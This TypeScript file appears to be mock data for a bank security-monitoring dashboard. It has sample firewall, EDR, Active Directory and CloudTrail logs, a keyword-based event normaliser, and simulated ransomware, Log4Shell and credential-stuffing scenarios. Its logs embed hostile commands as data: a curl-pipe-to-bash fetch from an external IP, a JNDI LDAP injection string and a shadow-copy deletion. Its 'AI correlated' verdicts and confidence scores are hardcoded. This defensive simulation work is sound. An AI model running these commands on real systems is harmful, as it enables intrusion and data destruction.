import { TelemetryEvent, SeverityLevel } from '../types/dataModel';

export const SAMPLE_RAW_LOGS = [
  `Mar 19 09:41:22 edge-fw-paloalto01 1,2026/03/19 09:41:22,001801000001,TRAFFIC,drop,1,2026/03/19 09:41:22,194.26.29.112,10.14.0.12,0.0.0.0,0.0.0.0,C2-Beacon-Pattern,vsys1,untrust,trust,ethernet1/1,,Outbound_Threat,2026/03/19 09:41:22,0,1,58291,443,0,0,0x0,tcp,deny,66,66,0,1,0,alert,1`,
  `{"timestamp":"2026-03-19T09:42:01.884Z","event_id":4625,"log_name":"Security","source":"Microsoft-Windows-Security-Auditing","computer":"DC-01.neobank.internal","account_name":"svc_admin_pay","workstation":"DESKTOP-R92L","failure_reason":"%%2313 - Unknown user name or bad password","status":"0xC000006D","sub_status":"0xC000006A","ip_address":"10.12.8.99"}`,
  `{"time_stamp":1773909745,"sensor_id":"CS-LINUX-9912","host_name":"upi-switch-prod-01","event_type":"SyntheticProcessExec","parent_process":"/usr/sbin/sshd","process_name":"/bin/sh","cmd_line":"sh -c 'curl -fsSL http://194.26.29.112/stage2.sh | bash'","sha256":"9f83c12a78e1b","tactic":"TA0002-Execution","technique":"T1059.004"}`,
  `AWS CloudTrail: {"eventTime":"2026-03-19T09:43:10Z","eventName":"PutBucketAcl","userIdentity":{"type":"IAMUser","userName":"devops_intern"},"sourceIPAddress":"185.220.101.5","requestParameters":{"bucketName":"neobank-customer-docs-export","AccessControlPolicy":{"Grants":[{"Grantee":{"URI":"http://acs.amazonaws.com/groups/global/AllUsers"},"Permission":"READ"}]}}}`,
  `Snort IDS Alert [1:2024309:1] EXPLOIT Liblzma XZ-Backdoor Signature Match [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 45.155.205.233:49182 -> 10.14.0.12:22`
];

export interface AttackScenario {
  id: string;
  name: string;
  category: string;
  description: string;
  injectedEventsCount: number;
  expectedRiskIncrease: number; // points
  triggerSimulatedEvents: () => TelemetryEvent[];
}

/**
 * Service Boundary for AI-assisted Normalization
 * Transforms multi-format unstructured logs into standardized TelemetryEvent objects.
 */
export function normalizeSecurityEvent(raw: string, index: number = 1): TelemetryEvent {
  const isC2 = raw.includes('C2') || raw.includes('194.26.29.112');
  const isAuthSpray = raw.includes('4625') || raw.includes('svc_admin_pay') || raw.includes('NTLM');
  const isCloudLeak = raw.includes('PutBucketAcl') || raw.includes('AllUsers');
  const isRce = raw.includes('XZ-Backdoor') || raw.includes('stage2.sh');

  let eventType: TelemetryEvent['eventType'] = 'EXPLOIT_ATTEMPT';
  let severity: SeverityLevel = 'HIGH';
  let sourceIp = '194.26.29.112';
  let destinationIp = '10.14.0.12';
  let targetAsset = 'Core UPI Switch Gateway';
  let assetId = 'ast-bnk-01';
  let normalizedDescription = 'AI Normalized: Potential initial access attempt detected via perimeter boundary.';
  let confidenceScore = 0.92;

  if (isC2) {
    eventType = 'C2_BEACONING';
    severity = 'CRITICAL';
    sourceIp = '194.26.29.112';
    targetAsset = 'Core UPI Switch Gateway';
    assetId = 'ast-bnk-01';
    normalizedDescription = 'AI Correlated: Outbound repetitive heartbeat telemetry matching FIN7 Command & Control infrastructure.';
    confidenceScore = 0.98;
  } else if (isAuthSpray) {
    eventType = 'AUTH_BRUTE_FORCE';
    severity = 'HIGH';
    sourceIp = '10.12.8.99';
    destinationIp = '10.10.1.10';
    targetAsset = 'Corporate Active Directory Domain Controller (DC-01)';
    assetId = 'ast-bnk-03';
    normalizedDescription = 'AI Correlated: High-frequency NTLM authentication failure burst targeting Domain Administrator account.';
    confidenceScore = 0.94;
  } else if (isCloudLeak) {
    eventType = 'POLICY_VIOLATION';
    severity = 'CRITICAL';
    sourceIp = '185.220.101.5';
    destinationIp = '52.76.110.42';
    targetAsset = 'AWS Production S3 Storage Vault';
    assetId = 'ast-bnk-05';
    normalizedDescription = 'AI Correlated: Critical CloudTrail alert: Public ACL granted to sensitive customer export bucket.';
    confidenceScore = 0.99;
  } else if (isRce) {
    eventType = 'PRIVILEGE_ESCALATION';
    severity = 'CRITICAL';
    sourceIp = '45.155.205.233';
    destinationIp = '10.14.0.12';
    targetAsset = 'Core UPI Switch Gateway';
    assetId = 'ast-bnk-01';
    normalizedDescription = 'AI Correlated: Weaponized exploit payload attempting liblzma backdoor injection on port 22.';
    confidenceScore = 0.97;
  }

  return {
    id: `evt-norm-${Date.now()}-${index}`,
    assetId,
    targetAsset,
    timestamp: new Date().toLocaleTimeString(),
    source: isC2 ? 'FIREWALL' : isAuthSpray ? 'ACTIVE_DIRECTORY' : isCloudLeak ? 'AWS_GUARDDUTY' : 'EDR_CROWDSTRIKE',
    sourceIp,
    destinationIp,
    eventType,
    normalizedCategory: eventType,
    severity,
    normalizedDescription,
    aiCorrelationNotes: normalizedDescription,
    rawMessage: raw,
    confidenceScore,
    isAnomaly: severity === 'CRITICAL',
    normalized: true,
    threatActorContext: isC2 ? 'Cobalt Strike / FIN7' : isRce ? 'State-Sponsored Actor' : 'Credential Spray Botnet'
  };
}

export const ATTACK_SCENARIOS: AttackScenario[] = [
  {
    id: 'scen-ransomware',
    name: 'LockBit 3.0 Ransomware Staging Sequence',
    category: 'RANSOMWARE_STAGING',
    description: 'Simulates lateral movement from compromised workstation into Active Directory domain controller with volume shadow copy deletion.',
    injectedEventsCount: 4,
    expectedRiskIncrease: 12,
    triggerSimulatedEvents: () => [
      normalizeSecurityEvent(`CrowdStrike EDR Alert: Process vssadmin.exe delete shadows /all /quiet executed on ast-bnk-03 by domain admin`, 1),
      normalizeSecurityEvent(`Active Directory Event 4672: Special privileges assigned to new untrusted logon session on DC-01`, 2),
      normalizeSecurityEvent(`Firewall Alert: 4.8 GB outbound encrypted stream to mega.nz cloud storage endpoint`, 3),
      normalizeSecurityEvent(`EDR Alert: Mass file renaming observed matching extension .lockbit3 in network shares`, 4)
    ]
  },
  {
    id: 'scen-log4shell',
    name: 'Log4Shell / Remote JNDI Injection Campaign',
    category: 'EXPLOIT_OUTBREAK',
    description: 'Simulates automated mass-scanning with obfuscated ${jndi:ldap://...} payloads attempting remote code execution on public API gateway.',
    injectedEventsCount: 3,
    expectedRiskIncrease: 9,
    triggerSimulatedEvents: () => [
      normalizeSecurityEvent(`WAF Log: User-Agent: \${jndi:ldap://attacker-controlled.net/exploit} intercepted on /api/v1/payment/callback`, 1),
      normalizeSecurityEvent(`Suricata IDS: ET EXPLOIT Apache Log4j RCE Attempt Outbound DNS Request to *.ldap-leak.com`, 2),
      normalizeSecurityEvent(`EDR Alert: Java process spawned unexpected /bin/bash child process on UPI Gateway Node`, 3)
    ]
  },
  {
    id: 'scen-cred-stuffing',
    name: 'Distributed Credential Stuffing & Account Takeover',
    category: 'IDENTITY_ATTACK',
    description: 'Simulates 50,000+ distributed login attempts from 800+ residential proxy IPs targeting the customer banking portal.',
    injectedEventsCount: 3,
    expectedRiskIncrease: 7,
    triggerSimulatedEvents: () => [
      normalizeSecurityEvent(`Active Directory: 4,800 failed Kerberos pre-authentications in 90 seconds from 120 unique remote subnets`, 1),
      normalizeSecurityEvent(`WAF Bot Manager: 94% anomaly confidence score on /login endpoint with rotating browser fingerprints`, 2),
      normalizeSecurityEvent(`AWS GuardDuty: High-volume failed API invocations with stolen expired session tokens`, 3)
    ]
  }
];

export function getInitialTelemetryEvents(): TelemetryEvent[] {
  return SAMPLE_RAW_LOGS.map((raw, idx) => normalizeSecurityEvent(raw, idx + 1));
}
